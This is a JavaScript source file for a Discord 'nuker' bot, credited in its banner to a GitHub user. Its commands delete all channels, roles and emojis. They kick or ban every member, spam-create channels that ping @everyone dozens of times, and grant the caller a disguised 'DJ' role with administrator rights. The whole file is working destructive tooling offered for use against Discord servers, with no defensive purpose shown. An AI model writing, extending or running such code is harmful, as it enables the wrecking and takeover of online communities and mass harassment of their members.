const { token, prefix, randomChannelNames, randomPingMessages, randomRoleNames, ownerId, publicUse } = require('./config.json');
const discord = require('discord.js');
const discBuilders = require('@discordjs/builders');
const { red, green, blue, cyan } = require('chalk');
const bot = new discord.Client({ intents: [discord.Intents.FLAGS.GUILD_PRESENCES, discord.Intents.FLAGS.GUILDS, discord.Intents.FLAGS.GUILD_MEMBERS, discord.Intents.FLAGS.GUILD_MESSAGES, discord.Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS, discord.Intents.FLAGS.GUILD_BANS]});

bot.once('ready', () => {
    console.log(cyan(`

	██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
	██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
	██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
	██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
	██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
	╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝																							   
					made by @unchilled on GH
`));
	console.log(green(`
Logged in as: ${bot.user.tag}
Owner ID: ${ownerId}
Prefix: ${prefix}
`));	
	console.log(cyan(`Commands: 
${prefix}nuke - delete all channels, roles, and emojis.
${prefix}spamnuke - delete all channels, roles, and emojis, spam create roles+channels and spam ping @everyone.
${prefix}kickall - kick all members from the server.
${prefix}banall - ban all members from the server.
${prefix}delchannels - delete all channels.
${prefix}delroles - delete all roles.
${prefix}admin - gives user stealthy admin role.
`)) 
})

bot.on('messageCreate', msg => {
	isOwner = false
	if(msg.member.id == ownerId || publicUse == "true") {
		isOwner = true
	}
	if(msg.content == prefix + 'spamnuke' && isOwner) {
		msg.guild.channels.cache.forEach(channel => channel.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
		msg.guild.emojis.cache.forEach(emoji => emoji.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
		msg.guild.roles.cache.forEach(role => role.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
		for (let i = 0; i < 100; i++) {
			var randomChannelNumber = Math.floor(Math.random()*randomChannelNames.length);
			msg.guild.channels.create(randomChannelNames[randomChannelNumber]).then(channel => {
				for (let i = 0; i < 30; i++) {
					var randomPingNumber = Math.floor(Math.random()*randomPingMessages.length);
					channel.send('@everyone ' + randomPingMessages[randomPingNumber]).catch((err) => { console.log(red("Error Found: " + err)) })
				}
			}).catch((err) => { console.log(red("Error Found: " + err)) });
			var randomRoleNumber = Math.floor(Math.random()*randomRoleNames.length);
			msg.guild.roles.create({ name: randomRoleNames[randomRoleNumber], color: "RANDOM", position: i++ }).catch((err) => { console.log(red("Error Found: " + err)) })
		}
		console.log(green(`${msg.guild.name} was spam nuked!`))
	} else if (msg.content == prefix + 'nuke' && isOwner) {
		msg.guild.channels.cache.forEach(channel => channel.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
		msg.guild.emojis.cache.forEach(emoji => emoji.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
		msg.guild.roles.cache.forEach(role => role.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
		console.log(green(`${msg.guild.name} was nuked!`))
	} else if (msg.content == prefix + 'kickall' && isOwner) {
		msg.guild.members.cache.forEach(member => {
			if(member.id != ownerId) member.kick().catch((err) => { console.log(red("Error Found: " + err)) });
		})
		console.log(green(`All members kicked in ${msg.guild.name}!`))
	} else if (msg.content == prefix + 'banall' && isOwner) {
		msg.guild.members.cache.forEach(member => {
			if(member.id != ownerId) member.ban().catch((err) => { console.log(red("Error Found: " + err)) });
		})
		console.log(green(`All members banned in ${msg.guild.name}!`))
	} else if (msg.content == prefix + 'delchannels' && isOwner) {
		msg.guild.channels.cache.forEach(channel => channel.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
		console.log(green(`All channels deleted in ${msg.guild.name}!`))
	} else if (msg.content == prefix + 'delroles' && isOwner) {
		msg.guild.roles.cache.forEach(role => role.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
		console.log(green(`All roles deleted in ${msg.guild.name}!`))
	} else if (msg.content == prefix + 'admin' && isOwner) {
		msg.guild.roles.create({
			name: 'DJ',
			permissions: 'ADMINISTRATOR',
			mentionable: false,
			hoist: false,
		}).then(role => msg.member.roles.add(role)).catch((err) => { console.log(red("Error Found: " + err)) })
		console.log(green(`${msg.member.username} given admin in ${msg.guild.name}!`))
	}
})

bot.login(token)